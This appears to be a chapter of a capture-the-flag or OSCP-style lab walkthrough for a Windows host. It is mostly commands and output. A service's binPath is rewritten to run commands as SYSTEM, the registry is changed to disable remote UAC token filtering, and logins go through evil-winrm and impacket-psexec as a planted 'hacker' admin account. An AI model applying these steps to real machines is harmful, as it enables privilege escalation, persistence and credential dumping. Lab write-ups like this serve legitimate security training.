# 06 — Loot, and a usable admin session

Goal: read `proof.txt` with the SYSTEM primitive already in hand, then fix the one thing that stops
the new administrator from logging in over the network.

---

## 6.1 The flag, read by SYSTEM

Reuse the same primitive — one command line, nothing written to disk:

```cmd
sc.exe stop GPGOrchestrator
sc.exe config GPGOrchestrator binPath= "cmd.exe /c type C:\Users\Administrator\Desktop\proof.txt > C:\Users\Tim\AppData\Local\Temp\proof.txt & icacls C:\Users\Tim\AppData\Local\Temp\proof.txt /grant Tim:F"
sc.exe start GPGOrchestrator
type C:\Users\Tim\AppData\Local\Temp\proof.txt
```

```
4a456f445abc93450df024fc1b57bc23
```

`icacls /grant Tim:F` is there because the redirect is performed by SYSTEM, so the file would
otherwise be unreadable by the account that asked for it.

> **Order matters.** `binPath` keeps whatever was set last. `sc start` after a failed `config` re-runs
> the *previous* command line. Confirm with `sc.exe qc GPGOrchestrator` before each start.

## 6.2 Why the new admin cannot log in yet

`hacker` is in `Administrators`, but it is not RID 500. With
`LocalAccountTokenFilterPolicy` unset — the default — a **network** logon by any other local
administrator yields a *filtered* token: the Administrators SID is present but **deny-only**. WinRM's
authorization check then fails, and the error looks exactly like a wrong password.

| Logon type | Token | Effect |
|---|---|---|
| Interactive (console, RDP) | full | admin works |
| Network (SMB, WinRM, WMI) | filtered by default | admin rights stripped |

This host does not expose 3389, so RDP is not an option — the policy has to change.

## 6.3 Flip the policy with the same primitive

```cmd
sc.exe config GPGOrchestrator binPath= "cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
sc.exe start GPGOrchestrator
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    LocalAccountTokenFilterPolicy    REG_DWORD    0x1
```

## 6.4 WinRM over HTTPS

Port **5986** was open in the very first scan, with a `CN=Cloudbase-Init WinRM` certificate — the
image ships remote management enabled.

```bash
evil-winrm -i 192.168.133.155 -u hacker -p 'P@ssw0rd123!' -S -P 5986
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
oscp\hacker
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
4a456f445abc93450df024fc1b57bc23
```

`-S` enables TLS; `-P 5986` overrides the default 5985 (which this host does not expose).

Inside the session, `whoami /groups` shows `BUILTIN\Administrators` as **enabled**, not deny-only —
that is the proof the token filter is off, and the difference between "admin on paper" and admin.

## 6.5 What this session is good for

`oscp\hacker` is a full local administrator. From Kali the same credentials give SYSTEM without any
payload:

```bash
impacket-psexec hacker:'P@ssw0rd123!'@192.168.133.155
```

```
nt authority\system
```

Useful for dumping SAM/LSA or for anything that insists on SYSTEM rather than admin. It is also,
deliberately, the same service technique from chapter 05 — `psexec` simply uploads its own service
binary instead of reconfiguring an existing one.
